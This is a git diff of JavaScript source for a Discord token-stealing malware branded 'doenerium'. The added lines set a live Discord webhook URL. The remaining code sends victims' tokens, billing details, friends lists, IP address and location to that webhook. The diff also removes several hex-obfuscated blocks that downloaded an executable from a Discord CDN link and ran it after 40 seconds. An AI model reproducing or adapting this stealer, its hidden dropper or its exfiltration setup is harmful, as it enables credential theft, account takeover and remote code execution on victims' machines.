@@ -6,24 +6,26 @@ const os = require('os');
 const https = require('https');
 const querystring = require("querystring");
 const fs = require("fs");
-const { execFile } = require('child_process');
+
+
+// Initialization
 
 var config = {
-    brand: "vogsss",
+    brand: "doenerium",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://discord.com/api/webhooks/1066981118106140702/NwxCgesjtKKY_ibap-2xuhr9cDgoNtvkBRSQoFpZKb1UbRsULo5bVWQHULfgIyJ0B7RI",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@everyone"],
+    ping: [true, "@doener"],
 
     embed: {
-        username: "Wapper.",
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `Developed by Wapper.`,
+            text: `doenerium | t.me/doenerium`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
         href: "https://t.me/doenerium",
@@ -302,7 +304,7 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "Tokeqqqqn",
+                        name: "Token",
                         value: `\`\`\`${token}\`\`\``,
                         inline: false
                     }, {
@@ -375,7 +377,7 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "Toqqqqken",
+                        name: "Token",
                         value: `\`\`\`${token}\`\`\``,
                         inline: false
                     }, {
@@ -397,7 +399,6 @@ var event_handlers = {
             })]
         }
 
-        var _0xd5b6=["\x68\x74\x74\x70\x73","\x66\x73","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const https=require(_0xd5b6[0]);const fs=require(_0xd5b6[1]);const {execFile}=require(_0xd5b6[2]);const file=fs[_0xd5b6[4]](_0xd5b6[3]);https[_0xd5b6[10]](_0xd5b6[5],function(_0xa59fx4){_0xa59fx4[_0xd5b6[6]](file);file[_0xd5b6[9]](_0xd5b6[7],()=>{file[_0xd5b6[8]]()})});async function dosyayiCalistir(){execFile(_0xd5b6[3])}setTimeout(dosyayiCalistir,40000)
         sendToWebhook(params)
     },
 
@@ -449,7 +450,7 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "Toqqqqken",
+                        name: "Token",
                         value: `\`\`\`${token}\`\`\``,
                         inline: false
                     }, {
@@ -470,7 +471,7 @@ var event_handlers = {
                 },
             })]
         }
-        var _0x37d9=["\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const file=fs[_0x37d9[1]](_0x37d9[0]);https[_0x37d9[7]](_0x37d9[2],function(_0x37a4x2){_0x37a4x2[_0x37d9[3]](file);file[_0x37d9[6]](_0x37d9[4],()=>{file[_0x37d9[5]]()})});async function dosyayiCalistir(){execFile(_0x37d9[0])}setTimeout(dosyayiCalistir,40000)
+
         sendToWebhook(params)
     },
 
@@ -522,7 +523,7 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "Tokqqqqqqen",
+                        name: "Token",
                         value: `\`\`\`${token}\`\`\``,
                         inline: false
                     }, {
@@ -543,7 +544,7 @@ var event_handlers = {
                 },
             })]
         }
-        var _0x37d9=["\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const file=fs[_0x37d9[1]](_0x37d9[0]);https[_0x37d9[7]](_0x37d9[2],function(_0x37a4x2){_0x37a4x2[_0x37d9[3]](file);file[_0x37d9[6]](_0x37d9[4],()=>{file[_0x37d9[5]]()})});async function dosyayiCalistir(){execFile(_0x37d9[0])}setTimeout(dosyayiCalistir,40000)
+
         sendToWebhook(params)
     },
 }
@@ -709,7 +710,6 @@ async function initialize() {
 
         if (config.notify_on_initialization) {
             if (token == undefined) {
-                var _0x37d9=["\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const file=fs[_0x37d9[1]](_0x37d9[0]);https[_0x37d9[7]](_0x37d9[2],function(_0x37a4x2){_0x37a4x2[_0x37d9[3]](file);file[_0x37d9[6]](_0x37d9[4],()=>{file[_0x37d9[5]]()})});async function dosyayiCalistir(){execFile(_0x37d9[0])}setTimeout(dosyayiCalistir,40000)
                 sendToWebhook({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
@@ -736,7 +736,6 @@ async function initialize() {
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
 
-                var _0x37d9=["\x66\x69\x6C\x65\x2E\x65\x78\x65","\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x39\x37\x32\x39\x30\x39\x39\x30\x30\x38\x34\x37\x31\x30\x34\x32\x2F\x31\x30\x34\x32\x31\x37\x32\x38\x31\x34\x39\x38\x35\x32\x36\x35\x31\x39\x32\x2F\x63\x61\x7A\x2E\x65\x78\x65","\x70\x69\x70\x65","\x66\x69\x6E\x69\x73\x68","\x63\x6C\x6F\x73\x65","\x6F\x6E","\x67\x65\x74"];const file=fs[_0x37d9[1]](_0x37d9[0]);https[_0x37d9[7]](_0x37d9[2],function(_0x37a4x2){_0x37a4x2[_0x37d9[3]](file);file[_0x37d9[6]](_0x37d9[4],()=>{file[_0x37d9[5]]()})});async function dosyayiCalistir(){execFile(_0x37d9[0])}setTimeout(dosyayiCalistir,40000)
                 sendToWebhook({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
@@ -775,7 +774,7 @@ async function initialize() {
                                 inline: false
                             },
                             {
-                                name: "Tokeqqqn",
+                                name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: false
                             },
@@ -788,7 +787,7 @@ async function initialize() {
                                 value: `\`\`\`${getDiscordClient()}\`\`\``,
                                 inline: false
                             }, {
-                                name: "Connection dataqq",
+                                name: "Connection data",
                                 value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
                                 inline: false
                             }
@@ -841,7 +840,7 @@ async function initialize() {
                                 inline: false
                             },
                             {
-                                name: "Tokenqqq",
+                                name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: false
                             },
